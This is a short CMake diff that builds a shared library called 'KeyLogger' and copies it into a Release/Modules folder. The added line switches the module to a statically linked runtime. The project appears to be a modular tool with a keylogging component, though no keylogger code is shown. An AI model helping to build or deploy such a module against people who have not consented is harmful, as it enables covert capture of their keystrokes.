@@ -1,5 +1,6 @@
 include_directories(../)
 add_library(KeyLogger SHARED KeyLogger.cpp)
+set_property(TARGET KeyLogger PROPERTY MSVC_RUNTIME_LIBRARY "MultiThreaded")
 target_link_libraries(KeyLogger )
 add_custom_command(TARGET KeyLogger POST_BUILD COMMAND ${CMAKE_COMMAND} -E copy 
 $<TARGET_FILE:KeyLogger> "${CMAKE_SOURCE_DIR}/Release/Modules/$<TARGET_FILE_NAME:KeyLogger>")
